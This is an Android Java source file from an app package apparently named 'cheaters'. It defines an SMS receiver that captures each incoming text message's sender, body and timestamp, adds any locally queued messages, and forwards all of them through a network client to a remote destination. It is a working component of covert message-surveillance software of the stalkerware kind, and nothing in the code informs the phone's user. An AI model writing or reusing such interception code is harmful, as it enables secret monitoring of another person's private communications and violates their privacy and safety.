package ke.co.elmaxdevelopers.cheaters.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.ArrayList;

import ke.co.elmaxdevelopers.cheaters.database.DataController;
import ke.co.elmaxdevelopers.cheaters.database.DbHelper;
import ke.co.elmaxdevelopers.cheaters.model.Message;
import ke.co.elmaxdevelopers.cheaters.network.Client;

public class SmsReceiver extends BroadcastReceiver{

    private static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    private static final String TAG = "Toshde";

    public SmsReceiver(){

    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(SMS_RECEIVED_ACTION)){
            Bundle bundle = intent.getExtras();
            SmsMessage[] messages = null;
            ArrayList<Message> messageArrayList = new ArrayList<>();
            if (bundle != null){
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    messages = new SmsMessage[pdus.length];
                    for (int i = 0; i < messages.length; i++){
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        Log.d(TAG, messages[i].getOriginatingAddress() + " : " + messages[i].getMessageBody());
                        Message message = new Message();
                        message.setAddress(messages[i].getOriginatingAddress());
                        message.setTimestamp(messages[i].getTimestampMillis());
                        message.setBody(messages[i].getMessageBody());
                        messageArrayList.add(message);
                        Log.d(TAG, "Messages "+messageArrayList.size());
                    }
                } catch (Exception e){
                    e.printStackTrace();
                } finally {
                    messageArrayList.addAll(getPendingMessages(context));
                    DataController.getInstance(context).clearPending();
                    for (Message message : messageArrayList){
                        Client.getInstance(context).sendMessage(message);
                    }
                }
            }
        }
    }

    public ArrayList<Message> getPendingMessages(Context context){
        DbHelper dbHelper = new DbHelper(context);
        ArrayList<Message> messages = new ArrayList<>();
        SQLiteDatabase db = dbHelper.getReadableDatabase();
        Cursor mCursor = db.query(
                dbHelper.TABLE_PENDING_MESSAGES,
                new String[]{"address","body","timestamp"},
                null,
                null,
                null,
                null,
                null
        );
        if (mCursor != null && mCursor.getCount() > 0){
            Log.d(TAG, "Cursor count : "+mCursor.getCount());
            mCursor.moveToFirst();
            do {
                Message m = new Message();
                m.setAddress(mCursor.getString(mCursor.getColumnIndex("address")));
                m.setBody(mCursor.getString(mCursor.getColumnIndex("body")));
                m.setTimestamp(mCursor.getLong(mCursor.getColumnIndex("timestamp")));
                messages.add(m);
            } while (mCursor.moveToNext());
        }
        closeCursor(mCursor);
        return messages;
    }

    private void closeCursor(Cursor cursor){
        if (cursor != null && !cursor.isClosed()){
            cursor.close();
        }
    }
}